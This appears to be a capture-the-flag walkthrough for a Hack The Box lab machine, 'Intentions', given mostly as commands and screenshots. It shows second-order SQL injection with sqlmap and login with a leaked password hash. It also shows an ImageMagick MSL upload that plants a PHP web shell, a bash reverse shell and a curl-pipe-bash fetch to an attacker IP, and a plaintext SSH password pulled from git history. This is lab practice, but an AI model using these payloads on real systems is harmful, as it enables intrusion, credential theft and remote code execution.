```
nmap -sS -sC -sV -T5 -Pn 10.10.11.220
```
![image](https://github.com/regarmulia/HTB/assets/33616880/528dff0c-5310-4215-a2d5-7be40b47e7bd)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://intentions.htb/FUZZ -fs 162 -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7e5bb805-89c5-4842-a466-280fab8a28f3)

```
registration
```
![image](https://github.com/regarmulia/HTB/assets/33616880/3a12ee51-5c45-49b3-8cff-a1730160b60d)


```
sqlmap -r req1.txt --batch
sqlmap -r req2b.txt --batch
```
![image](https://github.com/regarmulia/HTB/assets/33616880/a41968e9-a125-4022-9554-7a2015c569a3)


![image](https://github.com/regarmulia/HTB/assets/33616880/a8183c38-7b4f-423c-8661-ca351f473565)


![image](https://github.com/regarmulia/HTB/assets/33616880/318256aa-4f54-4605-b7d5-2b4add64a990)



```
sqlmap -r req1.txt --second-req=req2.txt --batch --tamper=space2comment
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1a7c8a8c-c45e-4474-86ac-090c34b7db0e)


![image](https://github.com/regarmulia/HTB/assets/33616880/806ea88f-c009-46ad-95b3-92d8e9cd2c79)


```
sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=space2comment --tables
```
![image](https://github.com/regarmulia/HTB/assets/33616880/230307ac-31be-47bc-9385-19d400791dd8)


```
sqlmap -r req1b.txt --second-req=req2b.txt --batch --tamper=space2comment -T users --dump
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0fa022ca-bc8b-4cfb-9d89-05da8947f30d)


```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u http://intentions.htb/api/v2/auth/ -b 403,404
```
![image](https://github.com/regarmulia/HTB/assets/33616880/a8a78134-9bdc-4b0b-9bcd-75725f2578f4)


```
http://10.10.11.220/api/v2/auth/login
curl -X POST http://intentions.htb/api/v2/auth/login
curl -X POST http://intentions.htb/api/v1/auth/login
```
![image](https://github.com/regarmulia/HTB/assets/33616880/94443e9d-fda1-424e-aa75-2bc33dbccf6e)


![image](https://github.com/regarmulia/HTB/assets/33616880/91adcde2-ab47-4d10-8890-016e7d0e6534)


```
curl -d 'email=steve@intentions.htb&hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa' -X POST http://intentions.htb/api/v2/auth/login
```
![image](https://github.com/regarmulia/HTB/assets/33616880/a740f795-07cd-49c5-b0fa-4cba7ec0a070)


![image](https://github.com/regarmulia/HTB/assets/33616880/50514396-8dea-43e8-8654-ee351d81958b)


```
http://10.10.11.220/
http://intentions.htb/api/v2/auth/login
Edited: v2, hash
```
![image](https://github.com/regarmulia/HTB/assets/33616880/20c9ec85-1a6a-4f92-b883-011609a50140)


![image](https://github.com/regarmulia/HTB/assets/33616880/9bde9358-3c79-4186-9cbc-63ebb13ec344)


```
http://intentions.htb/admin#/
http://intentions.htb/api/v2/admin/image/modify
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ce76950b-7767-47dd-a328-7d7953ee15f9)


![image](https://github.com/regarmulia/HTB/assets/33616880/0b6871de-0e54-44c1-9d14-27943f81f53b)


![image](https://github.com/regarmulia/HTB/assets/33616880/788c8136-6a8f-4715-95b9-e558c5b1a819)


```
python3 -m http.server 80
http://intentions.htb/api/v2/admin/image/modify
"path":"http://10.10.14.6/test”
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7446d685-b13d-437d-b177-a34ce4d105a0)


![image](https://github.com/regarmulia/HTB/assets/33616880/36a9081f-c32a-400f-b322-618f52ac3216)


```
curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IjYxcmJueWtFTTNib0FFOXlnUTdFL1E9PSIsInZhbHVlIjoibGRsUUgzWmhaSVpjaDNwcEJ4QXBFQ29XRnlSUHhwdE4zMXdsN2ZUbTFPREt2dmUyRHdGRzlhWS94bGFEU0xZTk9TNjlDVENIUnlYbDEwTzFWZzcxWk40dUZ0VGJLNmtBQmhTVEVnMkFlSUl2M2thbGU5eEZDdTh2NkNvcTV5SEciLCJtYWMiOiI1OWIwZDFkOTc3OWJjZWZhNDkzYTNhMTYyMjIwNGZmZmJjY2NkZGI5ODdlODVlY2U2OTU5ZGU0MmFiNTE2NTM4IiwidGFnIjoiIn0=' -H 'Cookie: XSRF-TOKEN=eyJpdiI6IjYxcmJueWtFTTNib0FFOXlnUTdFL1E9PSIsInZhbHVlIjoibGRsUUgzWmhaSVpjaDNwcEJ4QXBFQ29XRnlSUHhwdE4zMXdsN2ZUbTFPREt2dmUyRHdGRzlhWS94bGFEU0xZTk9TNjlDVENIUnlYbDEwTzFWZzcxWk40dUZ0VGJLNmtBQmhTVEVnMkFlSUl2M2thbGU5eEZDdTh2NkNvcTV5SEciLCJtYWMiOiI1OWIwZDFkOTc3OWJjZWZhNDkzYTNhMTYyMjIwNGZmZmJjY2NkZGI5ODdlODVlY2U2OTU5ZGU0MmFiNTE2NTM4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImVySlh1ZmlzOC9vRXdPaTRHK1A1RHc9PSIsInZhbHVlIjoicitCaW9NTDZNdnBzeVduN0dHek1Gd2gzMHV4ZmxFem9iOEZqUnJRUkg0YWhrdHIxNC9reU5pc3Z3LzhpeUNUdm5HMWhjSFZBZGowTnBvVVNzMnZPbTJGcHRIT205OUxIK2M4Z0RTeTFrVWpnQXlERU1ZOHlEUW9xbWZBV1pKZFQiLCJtYWMiOiJhMzg5NTdhOTQ0NjYwMjNhMWYyNThhYmM2NjljZmNhYWY0NTYzMWMwZGRiY2ZlZjQwYjAyN2Q3NTFmNWMwYWVhIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE3MTYzNjE1MTEsImV4cCI6MTcxNjM4MzExMSwibmJmIjoxNzE2MzYxNTExLCJqdGkiOiJZbGVJc0NkWnAzZXc0NWc2Iiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.Y-yF7_2agtJjTqtFeEThuabmwzTvhDCFoq6tHt0l3zc' -F 'path=vid:msl:/tmp/php*' -F 'effect=asd' -F file=@payload.msl
http://intentions.htb/storage/rce.php?c=ls
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c9c6203b-fe5d-4877-ac23-646845ae13ff)


![image](https://github.com/regarmulia/HTB/assets/33616880/d1878460-5ead-4c80-b142-42758ed435ac)


```
/bin/bash -i >& /dev/tcp/10.10.14.6/9001 0>&1
nc -nlvp 9001
http://intentions.htb/storage/rce.php?c=curl%2010.10.14.6/shell|bash
```
![image](https://github.com/regarmulia/HTB/assets/33616880/a087ac9e-afc2-423c-ac18-cb36c5d1f97c)

![image](https://github.com/regarmulia/HTB/assets/33616880/cd0cd12f-2df6-49c2-a38e-d4c5ceb77159)

![image](https://github.com/regarmulia/HTB/assets/33616880/c633d585-805d-4e35-8053-fd525fe104e3)


```
ls –la
git log –p
git config --global --add safe.directory /var/www/html/intentions
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f7596d08-39a1-4d35-b979-c91fb211ed4d)


```
HOME=/tmp git config --global --add safe.directory /var/www/html/intentions
HOME=/tmp git log –p
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0c4c5df4-014a-4c78-9f4a-d08ae2d9c0c2)


```
ssh greg@intentions.htb
Gr3g1sTh3B3stDev3l0per!1998!
```
![image](https://github.com/regarmulia/HTB/assets/33616880/95449770-cf05-4dbf-8dd2-634e8a9027a1)


```
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c38c8eac-7ea4-4d58-ada5-db7a90e2af7a)

![image](https://github.com/regarmulia/HTB/assets/33616880/722f714b-d18a-4103-8847-5969f95d9ce1)
